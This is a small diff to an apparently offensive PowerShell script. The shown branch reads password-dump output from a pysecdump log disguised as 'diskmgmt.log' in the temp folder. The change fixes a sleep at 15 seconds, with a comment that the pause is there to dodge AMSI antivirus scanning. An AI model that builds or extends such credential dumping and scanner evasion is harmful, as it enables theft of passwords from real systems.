@@ -120,7 +120,7 @@ If($GetPasswords -ieq "Enum"){
 
          }Else{## Read pysecdump logfile { diskmgmt.log }
 
-            Start-Sleep -Seconds $DelayTime ## Give some time in case amsi starts to scan execution!
+            Start-Sleep -Seconds 15 ## Give some time in case amsi starts to scan execution!
             Get-Content -Path "$Env:TMP\diskmgmt.log" -EA SilentlyContinue | Select-Object -Skip 4
 
          }
